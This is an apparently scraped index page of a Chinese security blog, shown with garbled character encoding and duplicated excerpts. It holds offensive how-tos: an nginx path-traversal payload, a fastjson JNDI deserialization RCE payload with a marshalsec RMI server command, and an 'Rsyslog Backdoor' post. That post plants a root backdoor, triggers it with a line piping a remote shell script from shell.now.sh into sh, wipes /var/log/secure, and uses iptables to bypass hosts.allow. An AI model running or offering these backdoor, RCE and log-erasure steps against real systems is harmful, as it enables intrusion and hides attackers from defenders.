			<a href="/2019/09/17/nginx_path_traversle.html" >nginxçš„ç›®å½•ç©¿è¶Š</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-09-17  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>nginxåœ¨ä½¿ç”¨proxy_passçš„æ—¶å€™ï¼Œéœ€è¦å¤„ç†é™æ€æ–‡ä»¶æœ‰æ—¶å€™ä¼šè¿™æ ·åš:</p>
<pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;
               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;
       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¸Šé¢å¦‚æœæ˜¯ä¸¤ä¸ªè·¯å¾„æœ€åéƒ½æ²¡æœ‰å¸¦<code>/</code>æˆ–è€…éƒ½å¸¦<code>/</code>åˆ™è¯¥æ¼æ´ä¸å­˜åœ¨ã€‚</p>
<p>ä»£ç†æœ«å°¾æ·»åŠ /ä¹‹åï¼Œnginxä¼šå…ˆå¯¹uriè¿›è¡Œnormalizedå¤„ç†ï¼Œä½¿ç”¨../è¯»å–æ–‡ä»¶ä¼šå¤±è´¥ï¼Œå½“æ²¡æœ‰æ·»åŠ /çš„æ—¶å€™ï¼Œnginxä¼šæŠŠåŸè¯·æ±‚ç›´æ¥è½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œæ‰€ä»¥å¯ä»¥è¯»å–æˆåŠŸã€‚</p>

	

	</div>
  <a type="button" href="/2019/09/17/nginx_path_traversle.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>nginxåœ¨ä½¿ç”¨proxy_passçš„æ—¶å€™ï¼Œéœ€è¦å¤„ç†é™æ€æ–‡ä»¶æœ‰æ—¶å€™ä¼šè¿™æ ·åš:</p>
<pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;
               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;
       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>payload:</p>
<pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä¸Šé¢å¦‚æœæ˜¯ä¸¤ä¸ªè·¯å¾„æœ€åéƒ½æ²¡æœ‰å¸¦<code>/</code>æˆ–è€…éƒ½å¸¦<code>/</code>åˆ™è¯¥æ¼æ´ä¸å­˜åœ¨ã€‚</p>
<p>ä»£ç†æœ«å°¾æ·»åŠ /ä¹‹åï¼Œnginxä¼šå…ˆå¯¹uriè¿›è¡Œnormalizedå¤„ç†ï¼Œä½¿ç”¨../è¯»å–æ–‡ä»¶ä¼šå¤±è´¥ï¼Œå½“æ²¡æœ‰æ·»åŠ /çš„æ—¶å€™ï¼Œnginxä¼šæŠŠåŸè¯·æ±‚ç›´æ¥è½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œæ‰€ä»¥å¯ä»¥è¯»å–æˆåŠŸã€‚</p>

	
	</div>
  <a type="button" href="/2019/09/17/nginx_path_traversle.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/07/22/fastjson-rce.html" >fastjsonè¢«åŠ¨æ‰«æBurpæ’ä»¶</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-07-22  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>2019/08/13 Update.</p>
<ol>
<li>ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°jsoné‡Œé¢å¥—jsonçš„æƒ…å†µã€‚</li>
<li>ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°åœ¨ä½¿ç”¨x-www-form-urlencodedçš„å‚æ•°æ˜¯jsonçš„æƒ…å†µã€‚<br>è¿™ä¸¤ä¸ªåŠ ä¸Šå»ä¹‹åæ„Ÿè§‰æ¯ä¸ªè¯·æ±‚çš„æ—¶é—´éƒ½ä¼šå¢åŠ ï¼Œå…ˆæŒ–å‘ã€‚</li>
</ol>
<p>2019/08/02 Update:</p>
<ol>
<li>ä¹‹å‰çš„ä»£ç å¤ªçš„å¤ªçƒ‚ï¼Œå»æ‰äº†ä¸ç”¨çš„ä»£ç </li>
<li>å¢åŠ äº†hashéªŒè¯ï¼Œå¦‚æœå·²ç»è¯·æ±‚è¿‡çš„URLç¬¬äºŒæ¬¡å°±ä¸æ£€æµ‹äº†ï¼Œéœ€å»ºç«‹<code>/var/tmp/hash.txt</code>æ–‡ä»¶ï¼ˆè‡ªå·±çœ‹ç€æ”¹å§)</li>
<li>å¦‚æœä¸ç†Ÿæ‚‰ï¼Œå°±çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæ–‡æ¡£ï¼Œæ–‡æ¡£ã€‚</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">main.py

#&#x2F;usr&#x2F;bin&#x2F;env python
#! -*- coding:utf-8 -*-

from burp import IBurpExtender # å®šä¹‰æ’ä»¶çš„åŸºæœ¬ä¿¡æ¯ç±»
from burp import IHttpListener # httpæµé‡ç›‘å¬ç±»
from burp import IRequestInfo
from noauth import noauth_request
import hashlib

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks &#x3D; callbacks
        self._helpers &#x3D; callbacks.getHelpers() # é€šç”¨å‡½æ•°
        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
        print &quot;load fastjson_scan plugin success!&quot;
        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
            if  messageIsRequest:
                request &#x3D; messageInfo.getRequest()
                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)
                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, è¿™é‡Œçœ‹å®˜æ–¹æ–‡æ¡£
                url &#x3D; str(messageInfo.getUrl())
                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:
                    lines &#x3D; f.read().splitlines()
                m &#x3D; hashlib.md5()
                m.update(url)
                print url
                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #æ˜¯çš„ï¼Œjsonçš„æ—¶å€™typeç­‰äº4
                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:
                        f.write(m.hexdigest()+&quot;\n&quot;)
                    print &quot;[Info]Check url is: %s&quot; % url
                    cur &#x3D; noauth_request(url)
                    noauth_result &#x3D; cur.run()
                    if noauth_result: 
                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
                    print &quot;&quot;
                else:
                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>fastjsonåœ¨<code>1.2.47</code>ä»¥ä¸‹ï¼ŒåŒ…æ‹¬1.2.47å­˜åœ¨ååºåˆ—åŒ–å¯¼è‡´çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œpayload:</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶ååœ¨è¿œç¨‹ä¸»æœºå¼€å¯rmiæœåŠ¡å’Œ<code>Exploit.class</code>webæœåŠ¡å°±å¯ä»¥æ‰“äº†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2019/07/22/fastjson-rce.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>2019/08/13 Update.</p>
<ol>
<li>ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°jsoné‡Œé¢å¥—jsonçš„æƒ…å†µã€‚</li>
<li>ä»£ç æ²¡æœ‰è€ƒè™‘åˆ°åœ¨ä½¿ç”¨x-www-form-urlencodedçš„å‚æ•°æ˜¯jsonçš„æƒ…å†µã€‚<br>è¿™ä¸¤ä¸ªåŠ ä¸Šå»ä¹‹åæ„Ÿè§‰æ¯ä¸ªè¯·æ±‚çš„æ—¶é—´éƒ½ä¼šå¢åŠ ï¼Œå…ˆæŒ–å‘ã€‚</li>
</ol>
<p>2019/08/02 Update:</p>
<ol>
<li>ä¹‹å‰çš„ä»£ç å¤ªçš„å¤ªçƒ‚ï¼Œå»æ‰äº†ä¸ç”¨çš„ä»£ç </li>
<li>å¢åŠ äº†hashéªŒè¯ï¼Œå¦‚æœå·²ç»è¯·æ±‚è¿‡çš„URLç¬¬äºŒæ¬¡å°±ä¸æ£€æµ‹äº†ï¼Œéœ€å»ºç«‹<code>/var/tmp/hash.txt</code>æ–‡ä»¶ï¼ˆè‡ªå·±çœ‹ç€æ”¹å§)</li>
<li>å¦‚æœä¸ç†Ÿæ‚‰ï¼Œå°±çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæ–‡æ¡£ï¼Œæ–‡æ¡£ã€‚</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">main.py

#&#x2F;usr&#x2F;bin&#x2F;env python
#! -*- coding:utf-8 -*-

from burp import IBurpExtender # å®šä¹‰æ’ä»¶çš„åŸºæœ¬ä¿¡æ¯ç±»
from burp import IHttpListener # httpæµé‡ç›‘å¬ç±»
from burp import IRequestInfo
from noauth import noauth_request
import hashlib

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks &#x3D; callbacks
        self._helpers &#x3D; callbacks.getHelpers() # é€šç”¨å‡½æ•°
        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
        print &quot;load fastjson_scan plugin success!&quot;
        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
            if  messageIsRequest:
                request &#x3D; messageInfo.getRequest()
                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)
                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, è¿™é‡Œçœ‹å®˜æ–¹æ–‡æ¡£
                url &#x3D; str(messageInfo.getUrl())
                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:
                    lines &#x3D; f.read().splitlines()
                m &#x3D; hashlib.md5()
                m.update(url)
                print url
                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #æ˜¯çš„ï¼Œjsonçš„æ—¶å€™typeç­‰äº4
                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:
                        f.write(m.hexdigest()+&quot;\n&quot;)
                    print &quot;[Info]Check url is: %s&quot; % url
                    cur &#x3D; noauth_request(url)
                    noauth_result &#x3D; cur.run()
                    if noauth_result: 
                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
                    print &quot;&quot;
                else:
                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>fastjsonåœ¨<code>1.2.47</code>ä»¥ä¸‹ï¼ŒåŒ…æ‹¬1.2.47å­˜åœ¨ååºåˆ—åŒ–å¯¼è‡´çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œpayload:</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶ååœ¨è¿œç¨‹ä¸»æœºå¼€å¯rmiæœåŠ¡å’Œ<code>Exploit.class</code>webæœåŠ¡å°±å¯ä»¥æ‰“äº†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2019/07/22/fastjson-rce.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/07/21/rsyslog-backdoor.html" >Rsyslog Backdoor</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-07-21  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>Centosè‡ªå¸¦rsyslogï¼Œç½‘ä¸Šæœ‰å…·ä½“åˆ©ç”¨è¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘è®°å½•ä¸‹ç®€å•çš„å‘ã€‚</p>
<h3 id="å»ºç«‹åé—¨"><a href="#å»ºç«‹åé—¨" class="headerlink" title="å»ºç«‹åé—¨"></a>å»ºç«‹åé—¨</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atg
chmod 755 &#x2F;bin&#x2F;atg

echo &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf

é‡å¯ç”Ÿæ•ˆ(Centosç”¨ä¸‹é¢çš„systemctl):
&#x2F;etc&#x2F;init.d&#x2F;rsyslog restart
systemctl restart rsyslog
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨:"></a>åˆ©ç”¨:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="æ“¦å±è‚¡"><a href="#æ“¦å±è‚¡" class="headerlink" title="æ“¦å±è‚¡:"></a>æ“¦å±è‚¡:</h3><pre class="line-numbers language-none"><code class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;secure
kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>å¦‚æœä¸»æœºè®¾å®šäº†<code>hosts.allow</code>çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨çš„é‚£ä¸€éƒ¨åˆ†æ˜¯æ— æ³•æˆåŠŸçš„ï¼Œå› ä¸ºè¿™ä¸ªsshçš„æ—¥å¿—ä¸ä¼šè¢«è®°å½•ã€‚æ‰€ä»¥å’§æˆ‘ä»¬å¯ä»¥åˆ©ç”¨iptables. :)</p>
<pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;å—å®³ä¸»æœº&gt; --dport 22 -s &lt;æ”»å‡»ä¸»æœº&gt; -j SNAT --to-source &lt;ipç™½åå•çš„åœ°å€&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2019/07/21/rsyslog-backdoor.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>Centosè‡ªå¸¦rsyslogï¼Œç½‘ä¸Šæœ‰å…·ä½“åˆ©ç”¨è¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘è®°å½•ä¸‹ç®€å•çš„å‘ã€‚</p>
<h3 id="å»ºç«‹åé—¨"><a href="#å»ºç«‹åé—¨" class="headerlink" title="å»ºç«‹åé—¨"></a>å»ºç«‹åé—¨</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atg
chmod 755 &#x2F;bin&#x2F;atg

echo &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf

é‡å¯ç”Ÿæ•ˆ(Centosç”¨ä¸‹é¢çš„systemctl):
&#x2F;etc&#x2F;init.d&#x2F;rsyslog restart
systemctl restart rsyslog
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨:"></a>åˆ©ç”¨:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="æ“¦å±è‚¡"><a href="#æ“¦å±è‚¡" class="headerlink" title="æ“¦å±è‚¡:"></a>æ“¦å±è‚¡:</h3><pre class="line-numbers language-none"><code class="language-none">sed -i &#39;&#x2F;xxxxx&#x2F;d&#39; &#x2F;var&#x2F;log&#x2F;secure
kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>å¦‚æœä¸»æœºè®¾å®šäº†<code>hosts.allow</code>çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨çš„é‚£ä¸€éƒ¨åˆ†æ˜¯æ— æ³•æˆåŠŸçš„ï¼Œå› ä¸ºè¿™ä¸ªsshçš„æ—¥å¿—ä¸ä¼šè¢«è®°å½•ã€‚æ‰€ä»¥å’§æˆ‘ä»¬å¯ä»¥åˆ©ç”¨iptables. :)</p>
<pre class="line-numbers language-none"><code class="language-none">iptables -t nat -A INPUT -p tcp -d &lt;å—å®³ä¸»æœº&gt; --dport 22 -s &lt;æ”»å‡»ä¸»æœº&gt; -j SNAT --to-source &lt;ipç™½åå•çš„åœ°å€&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2019/07/21/rsyslog-backdoor.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/06/24/tmux.html" >tmuxä½¿ç”¨</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-06-24  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>ç»„åˆé”®:</p>
<p>:new&lt;å›è½¦&gt;  å¯åŠ¨æ–°ä¼šè¯<br>s           åˆ—å‡ºæ‰€æœ‰ä¼šè¯<br>w           ç›¸å½“äºsçš„æ—¶å€™å±•å¼€åˆ—è¡¨ï¼Œå±•å¼€windows<br>$           é‡å‘½åå½“å‰ä¼šè¯</p>
<p>tmux kill-session -t demo # å…³é—­demoä¼šè¯</p>
<p>ä»–æœ‰ä¸€ä¸ªsession,windows,panesçš„æ¦‚å¿µ</p>
<p>ä¸€ä¸ªsessionå¯ä»¥æœ‰Nä¸ªwindowsï¼ŒNä¸ªpanes</p>
<p>å¦‚æœæ˜¯æœ€å¤§åŒ–åˆ©ç”¨ï¼Œé‚£ä¹ˆéœ€è¦æ‰¾åˆ°ä¸€ç§å¯ä»¥è·³æ¥è·³å»çš„æ–¹æ³•ï¼Œä¸ç®¡æ˜¯è·³windowsè¿˜æ˜¯sessionã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´æ˜¯è·³windowsï¼Œå› ä¸ºwindowsä¸‹æœ‰å‡ ä¸ªä¸åŒçš„panes</p>
<p>æ‰€ä»¥ï¼Œæ€ä¹ˆè·³æœ€å¿«?</p>
<p>nameä¸ç®¡æ˜¯paneè¿˜æ˜¯windowsï¼Œæ˜¯ä¸æ˜¯åªè¦æœ‰nameå°±å¯ä»¥è·³è¿‡å»ï¼Œä¸å¯¹ï¼Œåº”è¯¥æ˜¯windowsä¹‹é—´çš„è·³ï¼Œå› ä¸ºä¸€ç»„windowså°±æ˜¯ä¸€ç»„ä»»åŠ¡ã€‚</p>
<p>ä¸€ä¸ªsessioné‡Œé¢å¯ä»¥æœ€ä¸‹é¢çš„çŠ¶æ€æ å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªwindowsï¼Œwindowsçš„åå­—å¦‚ä½•</p>
	

	</div>
  <a type="button" href="/2019/06/24/tmux.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>ç»„åˆé”®:</p>
<p>:new&lt;å›è½¦&gt;  å¯åŠ¨æ–°ä¼šè¯<br>s           åˆ—å‡ºæ‰€æœ‰ä¼šè¯<br>w           ç›¸å½“äºsçš„æ—¶å€™å±•å¼€åˆ—è¡¨ï¼Œå±•å¼€windows<br>$           é‡å‘½åå½“å‰ä¼šè¯</p>
<p>tmux kill-session -t demo # å…³é—­demoä¼šè¯</p>
<p>ä»–æœ‰ä¸€ä¸ªsession,windows,panesçš„æ¦‚å¿µ</p>
<p>ä¸€ä¸ªsessionå¯ä»¥æœ‰Nä¸ªwindowsï¼ŒNä¸ªpanes</p>
<p>å¦‚æœæ˜¯æœ€å¤§åŒ–åˆ©ç”¨ï¼Œé‚£ä¹ˆéœ€è¦æ‰¾åˆ°ä¸€ç§å¯ä»¥è·³æ¥è·³å»çš„æ–¹æ³•ï¼Œä¸ç®¡æ˜¯è·³windowsè¿˜æ˜¯sessionã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´æ˜¯è·³windowsï¼Œå› ä¸ºwindowsä¸‹æœ‰å‡ ä¸ªä¸åŒçš„panes</p>
<p>æ‰€ä»¥ï¼Œæ€ä¹ˆè·³æœ€å¿«?</p>
<p>nameä¸ç®¡æ˜¯paneè¿˜æ˜¯windowsï¼Œæ˜¯ä¸æ˜¯åªè¦æœ‰nameå°±å¯ä»¥è·³è¿‡å»ï¼Œä¸å¯¹ï¼Œåº”è¯¥æ˜¯windowsä¹‹é—´çš„è·³ï¼Œå› ä¸ºä¸€ç»„windowså°±æ˜¯ä¸€ç»„ä»»åŠ¡ã€‚</p>
<p>ä¸€ä¸ªsessioné‡Œé¢å¯ä»¥æœ€ä¸‹é¢çš„çŠ¶æ€æ å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªwindowsï¼Œwindowsçš„åå­—å¦‚ä½•</p>
	
	</div>
  <a type="button" href="/2019/06/24/tmux.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/06/18/tornado-pentest.html" >è®°ä¸€æ¬¡æµ‹è¯•Tornado</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-06-18  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>å¸¸è§è¶Šæƒæµ‹è¯•å®Œäº†ä¹‹åï¼Œæœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ï¼Œä¸Šä¼ çš„æ–‡ä»¶åå­˜åœ¨åå°„xssï¼Œä¸»è¦è®°å½•ä¸‹ä»»æ„æ–‡ä»¶è¯»å–å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p>
<h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><ol>
<li><p>åˆšå¼€å§‹æµ‹è¯•ä»»æ„æ–‡ä»¶è¯»å–çš„æ—¶å€™ï¼Œæ‰¾ä¸åˆ°è¦è¯»å–çš„æ–‡ä»¶ï¼Œé—®äº†å¼€å‘ç›®å½•ç»“æ„æ‰è¯»å‡ºæ¥ï¼Œå¥½è ¢ã€‚å®é™…å¯ä»¥é€šè¿‡<code>/proc/self/cmdline</code> æŸ¥çœ‹å½“å‰ç¨‹åºçš„è¿è¡Œå‚æ•°ï¼Œå¯ä»¥è·å–åˆ°æºä»£ç æ–‡ä»¶åã€‚</p>
</li>
